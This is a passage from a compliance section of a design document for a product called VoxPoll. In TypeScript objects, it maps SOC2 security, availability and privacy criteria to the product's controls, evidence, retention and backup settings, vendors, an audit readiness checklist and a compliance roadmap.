          "Certificate management",
          "API security",
          "No sensitive data in URLs"
        ],
        evidence: [
          "SSL Labs report",
          "Certificate inventory",
          "API documentation"
        ]
      },
      "CC6.8": {
        requirement: "Implements controls to prevent malicious software",
        voxpollControls: [
          "Dependency vulnerability scanning",
          "Code scanning (SAST)",
          "Container image scanning",
          "Runtime protection"
        ],
        evidence: [
          "Snyk/npm audit reports",
          "SAST scan results",
          "Container scan results"
        ]
      }
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CC7: SYSTEM OPERATIONS
  // ────────────────────────────────────────────────────────────────────────────
  CC7: {
    name: "System Operations",
    criteria: {
      "CC7.1": {
        requirement: "Detects and monitors security events",
        voxpollControls: [
          "Security event logging",
          "SIEM/log aggregation",
          "Alerting rules",
          "Anomaly detection"
        ],
        evidence: [
          "Logging configuration",
          "Alert rules list",
          "Sample alerts",
          "Dashboard screenshots"
        ],
        voxpollImplementation: {
          logging: {
            events: [
              "Authentication events",
              "Authorization failures",
              "Data access events",
              "Configuration changes"
            ],
            retention: {
              security: "7 years",
              operational: "90 days",
              access: "30 days"
            }
          }
        }
      },
      "CC7.2": {
        requirement: "Monitors for security events indicating compromise",
        voxpollControls: [
          "Intrusion detection",
          "Failed login monitoring",
          "Data exfiltration detection",
          "Privilege escalation detection"
        ],
        evidence: [
          "IDS configuration",
          "Alert threshold documentation",
          "Sample incident alerts"
        ]
      },
      "CC7.3": {
        requirement: "Evaluates security events and determines impact",
        voxpollControls: [
          "Incident classification matrix",
          "Impact assessment procedures",
          "Triage process"
        ],
        evidence: [
          "Incident classification guide",
          "Triage procedures",
          "Sample incident tickets"
        ]
      },
      "CC7.4": {
        requirement: "Responds to security incidents",
        voxpollControls: [
          "Incident response plan",
          "Incident response team",
          "Communication procedures",
          "Escalation matrix"
        ],
        evidence: [
          "IRP document",
          "Team contact list",
          "Post-incident reports"
        ]
      },
      "CC7.5": {
        requirement: "Identifies and remedies discovered vulnerabilities",
        voxpollControls: [
          "Vulnerability management program",
          "Patch management process",
          "Remediation SLAs"
        ],
        evidence: [
          "Vulnerability scan reports",
          "Patch tracking",
          "Remediation tickets"
        ],
        voxpollImplementation: {
          remediationSLAs: {
            critical: "24 hours",
            high: "7 days",
            medium: "30 days",
            low: "90 days"
          }
        }
      }
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CC8: CHANGE MANAGEMENT
  // ────────────────────────────────────────────────────────────────────────────
  CC8: {
    name: "Change Management",
    criteria: {
      "CC8.1": {
        requirement: "Authorizes, designs, develops/acquires, configures, documents, tests, and implements changes",
        voxpollControls: [
          "Change management policy",
          "Code review requirements",
          "Testing requirements",
          "Deployment procedures"
        ],
        evidence: [
          "Policy document",
          "PR templates showing approval",
          "Test results",
          "Deployment logs"
        ],
        voxpollImplementation: {
          changeProcess: {
            development: [
              "Feature branch from main",
              "Code review by 2+ engineers",
              "Automated tests pass",
              "Security review for sensitive changes"
            ],
            deployment: [
              "Merge to main triggers CI/CD",
              "Deploy to staging",
              "Smoke tests",
              "Deploy to production",
              "Health checks"
            ],
            rollback: [
              "Automated rollback on health check failure",
              "Manual rollback procedures documented"
            ]
          }
        }
      }
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CC9: RISK MITIGATION
  // ────────────────────────────────────────────────────────────────────────────
  CC9: {
    name: "Risk Mitigation",
    criteria: {
      "CC9.1": {
        requirement: "Identifies, selects, and develops risk mitigation activities for vendor risks",
        voxpollControls: [
          "Vendor risk assessment process",
          "Vendor security questionnaires",
          "Vendor contract requirements",
          "Ongoing vendor monitoring"
        ],
        evidence: [
          "Vendor inventory",
          "Risk assessments",
          "Contract clauses",
          "Review meeting notes"
        ],
        voxpollImplementation: {
          criticalVendors: [
            { name: "AWS", type: "Infrastructure", soc2: true },
            { name: "MongoDB Atlas", type: "Database", soc2: true },
            { name: "Stripe", type: "Payments", pciDss: true },
            { name: "SendGrid", type: "Email", soc2: true }
          ]
        }
      },
      "CC9.2": {
        requirement: "Assesses and manages risks associated with vendors and business partners",
        voxpollControls: [
          "Annual vendor reviews",
          "SOC2 report collection",
          "Vendor incident notification requirements"
        ],
        evidence: [
          "Vendor SOC2 reports",
          "Review documentation",
          "Contract terms"
        ]
      }
    }
  }
}
```

## 17.16.3 Availability Trust Criteria (A Series)

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// SOC2 AVAILABILITY CRITERIA MAPPING
// ══════════════════════════════════════════════════════════════════════════════

const SOC2_AVAILABILITY_MAPPING = {
  "A1.1": {
    requirement: "Maintains infrastructure supporting system availability",
    voxpollControls: [
      "Multi-AZ deployment",
      "Auto-scaling configuration",
      "Load balancing",
      "Database replication"
    ],
    evidence: [
      "AWS architecture diagram",
      "Auto-scaling policies",
      "Uptime reports"
    ],
    voxpollImplementation: {
      infrastructure: {
        compute: "ECS Fargate with auto-scaling",
        database: "MongoDB Atlas with replication",
        cdn: "CloudFront edge locations",
        dns: "Route 53 with health checks"
      },
      sla: {
        target: "99.9%",
        measurement: "Monthly uptime percentage",
        exclusions: "Scheduled maintenance windows"
      }
    }
  },

  "A1.2": {
    requirement: "Implements recovery procedures to meet availability commitments",
    voxpollControls: [
      "Backup procedures",
      "Disaster recovery plan",
      "Recovery testing",
      "RPO/RTO definitions"
    ],
    evidence: [
      "Backup configuration",
      "DR plan document",
      "DR test results"
    ],
    voxpollImplementation: {
      backups: {
        database: {
          frequency: "Continuous (point-in-time)",
          retention: "35 days",
          location: "Cross-region"
        },
        files: {
          frequency: "Daily",
          retention: "30 days",
          location: "S3 cross-region replication"
        }
      },
      recovery: {
        rpo: "1 hour (point-in-time recovery)",
        rto: "4 hours",
        testingCadence: "Quarterly"
      }
    }
  },

  "A1.3": {
    requirement: "Tests recovery procedures",
    voxpollControls: [
      "Quarterly DR tests",
      "Backup restoration tests",
      "Failover tests",
      "Test documentation"
    ],
    evidence: [
      "Test plans",
      "Test results",
      "Lessons learned"
    ]
  }
}
```

## 17.16.4 Privacy Trust Criteria (P Series)

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// SOC2 PRIVACY CRITERIA MAPPING (Aligned with GDPR/KVKK)
// ══════════════════════════════════════════════════════════════════════════════

const SOC2_PRIVACY_MAPPING = {
  "P1": {
    name: "Notice",
    requirement: "Provides notice about privacy practices",
    voxpollControls: [
      "Privacy policy",
      "Cookie consent",
      "In-app privacy notices",
      "Data collection transparency"
    ],
    evidence: [
      "Privacy policy URL",
      "Consent screenshots",
      "Policy version history"
    ],
    gdprMapping: ["Article 12", "Article 13", "Article 14"]
  },

  "P2": {
    name: "Choice and Consent",
    requirement: "Obtains consent for collection and use of personal information",
    voxpollControls: [
      "Explicit consent collection",
      "Consent records",
      "Opt-out mechanisms",
      "Consent withdrawal"
    ],
    evidence: [
      "Consent flow screenshots",
      "Consent database records",
      "Preference center"
    ],
    gdprMapping: ["Article 6", "Article 7"],
    voxpollImplementation: {
      consentTypes: [
        { type: "essential", required: true, description: "Account operation" },
        { type: "analytics", required: false, description: "Usage analytics" },
        { type: "marketing", required: false, description: "Marketing emails" }
      ],
      consentStorage: "ConsentLog collection with timestamps"
    }
  },

  "P3": {
    name: "Collection",
    requirement: "Collects personal information consistent with objectives",
    voxpollControls: [
      "Data minimization",
      "Purpose limitation",
      "Lawful basis documentation",
      "Data inventory"
    ],
    evidence: [
      "Data inventory spreadsheet",
      "Lawful basis records",
      "Collection procedures"
    ],
    gdprMapping: ["Article 5(1)(b)", "Article 5(1)(c)"]
  },

  "P4": {
    name: "Use, Retention, and Disposal",
    requirement: "Limits use, retains, and disposes of personal information",
    voxpollControls: [
      "Data retention policy",
      "Automated deletion",
      "Data lifecycle management",
      "Secure disposal"
    ],
    evidence: [
      "Retention schedules",
      "Deletion job logs",
      "Disposal certificates"
    ],
    gdprMapping: ["Article 5(1)(e)", "Article 17"],
    voxpollImplementation: {
      retentionPeriods: {
        accountData: "Account lifetime + 30 days",
        contentData: "Until deleted by user + 30 days",
        auditLogs: "7 years",
        analyticsData: "Anonymized after 90 days"
      }
    }
  },

  "P5": {
    name: "Access",
    requirement: "Provides access to personal information",
    voxpollControls: [
      "Data export feature",
      "Access request process",
      "Response SLA"
    ],
    evidence: [
      "Export feature screenshots",
      "Access request logs",
      "Response time reports"
    ],
    gdprMapping: ["Article 15"],
    voxpollImplementation: {
      dataExport: {
        endpoint: "GET /api/users/me/export",
        format: "JSON",
        includes: ["profile", "content", "interactions", "settings"],
          sla: "30 days (usually instant for digital)"
      }
    }
  },

  "P6": {
    name: "Disclosure and Notification",
    requirement: "Discloses personal information and notifies of breaches",
    voxpollControls: [
      "Third-party disclosure policy",
      "Breach notification procedures",
      "DPA agreements",
      "Subprocessor list"
    ],
    evidence: [
      "Subprocessor list",
      "DPA templates",
      "Breach response procedures"
    ],
    gdprMapping: ["Article 28", "Article 33", "Article 34"],
    voxpollImplementation: {
      breachNotification: {
        regulatorSLA: "72 hours",
        userSLA: "Without undue delay if high risk",
        procedure: "See §17.8 Data Breach Response"
      }
    }
  },

  "P7": {
    name: "Quality",
    requirement: "Maintains accurate and complete personal information",
    voxpollControls: [
      "User profile editing",
      "Data correction requests",
      "Validation rules"
    ],
    evidence: [
      "Profile edit feature",
      "Correction request process"
    ],
    gdprMapping: ["Article 16"]
  },

  "P8": {
    name: "Monitoring and Enforcement",
    requirement: "Monitors compliance with privacy commitments",
    voxpollControls: [
      "Privacy impact assessments",
      "Privacy reviews in development",
      "DPO oversight",
      "Privacy audits"
    ],
    evidence: [
      "PIA templates",
      "Review checklists",
      "Audit reports"
    ],
    gdprMapping: ["Article 35", "Article 37-39"]
  }
}
```

## 17.16.5 SOC2 Evidence Collection

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// SOC2 AUDIT EVIDENCE COLLECTION
// ══════════════════════════════════════════════════════════════════════════════

const SOC2_EVIDENCE_FRAMEWORK = {
  // ────────────────────────────────────────────────────────────────────────────
  // EVIDENCE CATEGORIES
  // ────────────────────────────────────────────────────────────────────────────
  categories: {
    POLICIES: {
      description: "Documented policies and procedures",
      examples: [
        "Information Security Policy",
        "Access Control Policy",
        "Incident Response Plan",
        "Data Retention Policy",
        "Change Management Policy"
      ],
      format: "PDF documents with version control",
      reviewCadence: "Annual"
    },

    CONFIGURATIONS: {
      description: "System and application configurations",
      examples: [
        "AWS security group rules",
        "IAM policies",
        "Database access controls",
        "TLS configuration",
        "Logging configuration"
      ],
      format: "Screenshots, exports, Infrastructure as Code",
      reviewCadence: "Continuous (changes tracked)"
    },

    LOGS: {
      description: "System and audit logs",
      examples: [
        "Authentication logs",
        "Access control logs",
        "Change logs",
        "Error logs",
        "Security event logs"
      ],
      format: "Log exports, dashboard screenshots",
      reviewCadence: "Real-time monitoring, periodic review"
    },

    REPORTS: {
      description: "Periodic assessment reports",
      examples: [
        "Vulnerability scan reports",
        "Penetration test reports",
        "Access review reports",
        "Incident reports",
        "DR test reports"
      ],
      format: "PDF reports with findings",
      reviewCadence: "Per assessment schedule"
    },

    TICKETS: {
      description: "Issue tracking records",
      examples: [
        "Access request tickets",
        "Change tickets",
        "Incident tickets",
        "Exception approvals"
      ],
      format: "Jira/issue tracker exports",
      reviewCadence: "As needed"
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // EVIDENCE COLLECTION SCHEDULE
  // ────────────────────────────────────────────────────────────────────────────
  collectionSchedule: {
    continuous: [
      "Audit logs (automated)",
      "Access logs (automated)",
      "Change logs (automated)",
      "Security alerts (automated)"
    ],
    weekly: [
      "Vulnerability scan results",
      "Access review samples",
      "Incident summary"
    ],
    monthly: [
      "User access listing",
      "Policy exception review",
      "Security metrics dashboard"
    ],
    quarterly: [
      "Access certification review",
      "Policy review status",
      "Vendor review status",
      "DR test results",
      "Penetration test results"
    ],
    annually: [
      "Full policy review",
      "Risk assessment",
      "Security awareness training completion",
      "Vendor SOC2 report collection"
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // AUTOMATED EVIDENCE COLLECTION
  // ────────────────────────────────────────────────────────────────────────────
  automation: {
    tools: [
      {
        name: "Vanta / Drata / Secureframe",
        purpose: "Continuous compliance monitoring",
        features: [
          "Automated evidence collection",
          "Control monitoring",
          "Policy management",
          "Vendor risk management"
        ]
      },
      {
        name: "AWS Config",
        purpose: "Configuration compliance",
        rules: [
          "s3-bucket-ssl-requests-only",
          "rds-storage-encrypted",
          "encrypted-volumes",
          "iam-password-policy"
        ]
      },
      {
        name: "CloudWatch",
        purpose: "Log aggregation and alerting",
        dashboards: [
          "Security events",
          "Access patterns",
          "Error rates"
        ]
      }
    ],

    evidenceRepository: {
      location: "S3 bucket with versioning",
      structure: `
        soc2-evidence/
        ├── policies/
        │   ├── information-security-policy-v1.2.pdf
        │   └── ...
        ├── configurations/
        │   ├── 2024-Q1/
        │   │   ├── aws-iam-export.json
        │   │   └── ...
        │   └── ...
        ├── logs/
        │   ├── 2024-01/
        │   │   ├── auth-logs-sample.json
        │   │   └── ...
        │   └── ...
        ├── reports/
        │   ├── pentests/
        │   ├── vulnerability-scans/
        │   └── access-reviews/
        └── tickets/
            └── jira-exports/
      `,
      retention: "7 years",
      accessControl: "Security team only"
    }
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// SOC2 AUDIT READINESS CHECKLIST
// ══════════════════════════════════════════════════════════════════════════════

const SOC2_READINESS_CHECKLIST = {
  preAudit: [
    "□ Gap assessment completed",
    "□ Policies reviewed and updated",
    "□ Evidence collection automated where possible",
    "□ Control owners identified",
    "□ Evidence repository organized",
    "□ Internal audit completed",
    "□ Findings remediated",
    "□ Employee training completed"
  ],

  duringAudit: [
    "□ Point of contact available",
    "□ System access for auditors arranged",
    "□ Evidence requests tracked",
    "□ Walkthroughs scheduled",
    "□ Interview participants prepared"
  ],

  postAudit: [
    "□ Draft report reviewed",
    "□ Management response prepared",
    "□ Findings remediation planned",
    "□ Report distributed to stakeholders",
    "□ Continuous improvement plan updated"
  ]
}
```

## 17.16.6 Control Matrix Summary

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// VOXPOLL SOC2 CONTROL MATRIX SUMMARY
// ══════════════════════════════════════════════════════════════════════════════

const VOXPOLL_CONTROL_MATRIX = {
  summary: {
    totalCriteria: 64,
    securityCriteria: 33,
    availabilityCriteria: 3,
    privacyCriteria: 8,
    implementationStatus: {
      implemented: 58,
      partiallyImplemented: 4,
      planned: 2
    }
  },

  keyControls: [
    {
      area: "Access Control",
      controls: [
        "JWT-based authentication",
        "RBAC authorization",
        "MFA support",
        "Session management"
      ],
      criteria: ["CC6.1", "CC6.2", "CC6.3"]
    },
    {
      area: "Data Protection",
      controls: [
        "TLS 1.3 encryption in transit",
        "AES-256 encryption at rest",
        "Data classification",
        "PII handling procedures"
      ],
      criteria: ["CC6.6", "CC6.7", "P3", "P4"]
    },
    {
      area: "Monitoring",
      controls: [
        "Centralized logging (ELK/CloudWatch)",
        "Security alerting",
        "Anomaly detection",
        "Incident response"
      ],
      criteria: ["CC7.1", "CC7.2", "CC7.3", "CC7.4"]
    },
    {
      area: "Change Management",
      controls: [
        "Version control (Git)",
        "Code review requirements",
        "CI/CD pipeline",
        "Deployment approvals"
      ],
      criteria: ["CC8.1"]
    },
    {
      area: "Vendor Management",
      controls: [
        "Vendor risk assessment",
        "SOC2 report review",
        "DPA agreements",
        "Subprocessor management"
      ],
      criteria: ["CC9.1", "CC9.2", "P6"]
    },
    {
      area: "Business Continuity",
      controls: [
        "Multi-AZ deployment",
        "Database replication",
        "Backup procedures",
        "DR testing"
      ],
      criteria: ["A1.1", "A1.2", "A1.3"]
    }
  ],

  complianceRoadmap: {
    phase1: {
      name: "Foundation",
      timeline: "Months 1-3",
      activities: [
        "Gap assessment",
        "Policy documentation",
        "Control implementation",
        "Evidence collection setup"
      ]
    },
    phase2: {
      name: "Maturation",
      timeline: "Months 4-6",
      activities: [
        "Internal audit",
        "Remediation",
        "Process refinement",
        "Training"
      ]
    },
    phase3: {
      name: "Audit",
      timeline: "Months 7-9",
      activities: [
        "Type I audit (point in time)",
        "Address findings",
        "Begin Type II period"
      ]
    },
    phase4: {
      name: "Type II",
      timeline: "Months 10-15",
      activities: [
        "6-month observation period",
        "Continuous evidence collection",
        "Type II audit",
        "Report issuance"
      ]
    }
  }
}
```


# ══════════════════════════════════════════════════════════════════════════════
# END OF SECTION 17 - SECURITY & COMPLIANCE (GDPR/KVKK)
# ══════════════════════════════════════════════════════════════════════════════
